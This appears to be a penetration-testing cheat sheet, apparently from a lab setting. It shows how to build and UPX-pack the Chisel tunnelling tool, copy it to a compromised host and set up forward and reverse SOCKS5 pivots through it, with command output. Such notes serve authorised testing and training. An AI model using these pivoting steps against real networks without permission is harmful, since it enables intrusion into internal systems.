# Chisel

## Building

```sh
my@attack:~$ git clone https://github.com/jpillora/chisel.git
my@attack:~$ cd chisel
my@attack:~/chisel$ CGO_ENABLED=0 go build
```

## Compressing the Binary

```sh
my@attack:~/chisel$ chmod +x chisel
my@attack:~/chisel$ upx --brute --no-lzma chisel
```

```output title="Output" hl_lines="7"
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2025
UPX 5.0.0       Markus Oberhumer, Laszlo Molnar & John Reiser   Feb 20th 2025

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
  14924031 ->   8503892   56.98%   linux/amd64   chisel

Packed 1 file.
```

## Binary Transfer

```sh
my@attack:~/chisel$ scp chisel ubuntu@10.129.15.50:/tmp
```

## Setting Up

### Server on Pivot

```sh
ubuntu@WEB01:~$ /tmp/chisel server -v -p 1234 --socks5
```

```output title="Output"
2025/05/03 19:40:15 server: Fingerprint LFfQCRGeBwVeHh4xu083mF0aH8IukW/za5LkuFnz3Ko=
2025/05/03 19:40:15 server: Listening on http://0.0.0.0:1234
```

### Client on Attack Machine

```sh
my@attack:~/chisel$ ./chisel client -v 10.129.15.50:1234 9050:socks
```

```output title="Output" hl_lines="2"
2025/05/03 22:40:33 client: Connecting to ws://10.129.15.50:1234
2025/05/03 22:40:33 client: tun: proxy#127.0.0.1:9050=>socks: Listening
2025/05/03 22:40:33 client: tun: Bound proxies
2025/05/03 22:40:33 client: Handshaking...
2025/05/03 22:40:38 client: Sending config
2025/05/03 22:40:38 client: Connected (Latency 174.318016ms)
2025/05/03 22:40:38 client: tun: SSH connected
```

## Setting Up (Reverse)

### Server on Attack Machine

```sh
my@attack:~/chisel$ ./chisel server -v -p 1234 --socks5 --reverse
```

```output title="Output"
2025/05/03 22:52:13 server: Reverse tunnelling enabled
2025/05/03 22:52:13 server: Fingerprint /eAoLvh1EYwkzWKoU83F+YWU8vx6Je3GFerWbkq+yKY=
2025/05/03 22:52:13 server: Listening on http://0.0.0.0:1234
```

### Client on Pivot

```sh
ubuntu@WEB01:~$ /tmp/chisel client -v 10.10.15.109:1234 R:9050:socks
```

```output title="Output" hl_lines="1"
2025/05/03 19:54:40 client: Connecting to ws://10.10.15.109:1234
2025/05/03 19:54:42 client: Handshaking...
2025/05/03 19:54:43 client: Sending config
2025/05/03 19:54:43 client: Connected (Latency 144.633284ms)
2025/05/03 19:54:43 client: tun: SSH connected
```
